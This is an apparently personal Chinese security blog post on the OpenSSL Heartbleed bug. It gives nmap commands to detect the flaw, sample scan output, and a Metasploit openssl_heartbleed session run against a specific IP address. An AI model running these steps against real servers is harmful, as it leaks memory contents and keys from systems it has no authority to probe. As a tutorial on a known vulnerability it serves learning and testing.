<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>openssl心脏滴血漏洞 | dlam</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="漏洞原理64kb导致溢出
漏洞检测检测是否存在心脏滴血漏洞

首先安装两个依赖包非常实用的hack工具组合，首先得升级msfconsole至最新版，然后给nmap添加一个针对heartbleed的扫描脚本，用来发现心脏出血漏洞：cd /usr/share/nmap/scripts/wget https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nsecd">
<meta property="og:type" content="article">
<meta property="og:title" content="openssl心脏滴血漏洞">
<meta property="og:url" content="http://yoursite.com/2016/08/18/openssl心脏滴血漏洞/index.html">
<meta property="og:site_name" content="dlam">
<meta property="og:description" content="漏洞原理64kb导致溢出
漏洞检测检测是否存在心脏滴血漏洞

首先安装两个依赖包非常实用的hack工具组合，首先得升级msfconsole至最新版，然后给nmap添加一个针对heartbleed的扫描脚本，用来发现心脏出血漏洞：cd /usr/share/nmap/scripts/wget https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nsecd">
<meta property="og:image" content="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/14/1.png?raw=true">
<meta property="og:image" content="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/14/2.png?raw=true">
<meta property="og:updated_time" content="2016-08-18T12:14:18.706Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="openssl心脏滴血漏洞">
<meta name="twitter:description" content="漏洞原理64kb导致溢出
漏洞检测检测是否存在心脏滴血漏洞

首先安装两个依赖包非常实用的hack工具组合，首先得升级msfconsole至最新版，然后给nmap添加一个针对heartbleed的扫描脚本，用来发现心脏出血漏洞：cd /usr/share/nmap/scripts/wget https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nsecd">
<meta name="twitter:image" content="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/14/1.png?raw=true">
  
    <link rel="alternate" href="/atom.xml" title="dlam" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="../../../../css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="../../../../index.html" id="logo">dlam</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="../../../../index.html">Home</a>
        
          <a class="main-nav-link" href="../../../../archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-openssl心脏滴血漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="" class="article-date">
  <time datetime="2016-08-18T12:03:36.000Z" itemprop="datePublished">2016-08-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="../../../../categories/WEB/">WEB</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      openssl心脏滴血漏洞
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/14/1.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/14/2.png?raw=true" alt="image"><br>64kb导致溢出</p>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><strong>检测是否存在心脏滴血漏洞</strong></p>
<ul>
<li>首先安装两个依赖包<br>非常实用的hack工具组合，首先得升级msfconsole至最新版，然后给nmap添加一个针对heartbleed的扫描脚本，用来发现心脏出血漏洞：<br>cd /usr/share/nmap/scripts/<br>wget <a href="https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse" target="_blank" rel="external">https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse</a><br>cd /usr/share/nmap/nselib/<br>wget <a href="https://svn.nmap.org/nmap/nselib/tls.lua" target="_blank" rel="external">https://svn.nmap.org/nmap/nselib/tls.lua</a><br>nmap –script-updatedb<br>添加成功之后扫描一个没有更新openssl的网站：<br>nmap -n -p 443 -Pn –script=ssl-heartbleed servers_ip<br>出现如下漏洞信息：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Nmap scan report for xxx.yyy (xxx_ip)</div><div class="line">Host is up (0.071s latency).</div><div class="line">PORT    STATE SERVICE</div><div class="line">443/tcp open  https</div><div class="line">| ssl-heartbleed:</div><div class="line">|   VULNERABLE:</div><div class="line">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</div><div class="line">|     State: VULNERABLE</div><div class="line">|     Risk factor: High</div><div class="line">|     Description:</div><div class="line">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</div><div class="line">|           </div><div class="line">|     References:</div><div class="line">|       http://cvedetails.com/cve/2014-0160/</div><div class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</div><div class="line">|_      http://www.openssl.org/news/secadv_20140407.txt</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">然后msfconsole载入 auxiliary/scanner/ssl/openssl_heartbleed 模块：</div><div class="line">msf &gt; use auxiliary/scanner/ssl/openssl_heartbleedset RHOSTS xxx_ipset RPORT 443set VERBOSE trueexploit</div><div class="line">进入msfconsole</div><div class="line">msf &gt; use auxiliary/scanner/ssl/openssl_heartbleed</div><div class="line"> msf auxiliary(openssl_heartbleed) &gt; show options</div><div class="line"> msf auxiliary(openssl_heartbleed) &gt; set r</div><div class="line">set response_timeout  set rhosts            set rport</div><div class="line">msf auxiliary(openssl_heartbleed) &gt; set r</div><div class="line">set response_timeout  set rhosts            set rport</div><div class="line">msf auxiliary(openssl_heartbleed) &gt; set rhosts 115.28.100.222</div><div class="line">rhosts =&gt; 115.28.100.222</div><div class="line">msf auxiliary(openssl_heartbleed) &gt; set rport 443</div><div class="line">rport =&gt; 443</div><div class="line">msf auxiliary(openssl_heartbleed) &gt; set verbose true</div><div class="line">verbose =&gt; true</div><div class="line">msf auxiliary(openssl_heartbleed) &gt; exploit</div><div class="line">115.28.100.222:8080/pyadmin</div></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/08/18/openssl心脏滴血漏洞/" data-id="cis0ahoc7000gjwhrk8z0bu9n" class="article-share-link">Share</a>
      
        <a href="http://yoursite.com/2016/08/18/openssl心脏滴血漏洞/#disqus_thread" class="article-comment-link">Comments</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/openssl/">openssl</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="../../11/文件上传之解析漏洞/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">文件上传之解析漏洞</div>
    </a>
  
</nav>

  
</article>


<section id="comments">
  <div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
  </div>
</section>
</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="../../../../categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/安全/">安全</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/centos/">centos</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/github/">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/google/">google</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/linux问题/">linux问题</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/openssl/">openssl</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/tcp-ip/">tcp/ip</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/tomcat/">tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/webshell/">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/win2003/">win2003</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/上传/">上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/执行/">执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/敏感信息/">敏感信息</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/文件包含/">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/流程/">流程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/逻辑/">逻辑</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="../../../../tags/centos/" style="font-size: 16.67px;">centos</a> <a href="../../../../tags/csrf/" style="font-size: 10px;">csrf</a> <a href="../../../../tags/github/" style="font-size: 10px;">github</a> <a href="../../../../tags/google/" style="font-size: 10px;">google</a> <a href="../../../../tags/linux问题/" style="font-size: 10px;">linux问题</a> <a href="../../../../tags/mysql/" style="font-size: 10px;">mysql</a> <a href="../../../../tags/openssl/" style="font-size: 10px;">openssl</a> <a href="../../../../tags/redis/" style="font-size: 13.33px;">redis</a> <a href="../../../../tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="../../../../tags/sql注入/" style="font-size: 20px;">sql注入</a> <a href="../../../../tags/tcp-ip/" style="font-size: 10px;">tcp/ip</a> <a href="../../../../tags/tomcat/" style="font-size: 10px;">tomcat</a> <a href="../../../../tags/webshell/" style="font-size: 10px;">webshell</a> <a href="../../../../tags/win2003/" style="font-size: 10px;">win2003</a> <a href="../../../../tags/xss/" style="font-size: 13.33px;">xss</a> <a href="../../../../tags/上传/" style="font-size: 16.67px;">上传</a> <a href="../../../../tags/执行/" style="font-size: 13.33px;">执行</a> <a href="../../../../tags/敏感信息/" style="font-size: 10px;">敏感信息</a> <a href="../../../../tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="../../../../tags/流程/" style="font-size: 10px;">流程</a> <a href="../../../../tags/逻辑/" style="font-size: 10px;">逻辑</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2016/05/">May 2016</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="">openssl心脏滴血漏洞</a>
          </li>
        
          <li>
            <a href="../../11/文件上传之解析漏洞/">文件上传之解析漏洞</a>
          </li>
        
          <li>
            <a href="../../08/centos搭建tomcat以及漏洞利用/">centos搭建tomcat以及漏洞利用</a>
          </li>
        
          <li>
            <a href="../../05/webshell的获取与查杀/">webshell的获取与查杀</a>
          </li>
        
          <li>
            <a href="../../05/redis漏洞利用/">redis漏洞利用</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 春天的春，晴天的晴<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
  
    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
  
</nav>
    
<script>
  var disqus_shortname = 'liuqi';
  
  var disqus_url = 'http://yoursite.com/2016/08/18/openssl心脏滴血漏洞/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="../../../../fancybox/jquery.fancybox.css">
  <script src="../../../../fancybox/jquery.fancybox.pack.js"></script>


<script src="../../../../js/script.js"></script>

  </div>
</body>
</html>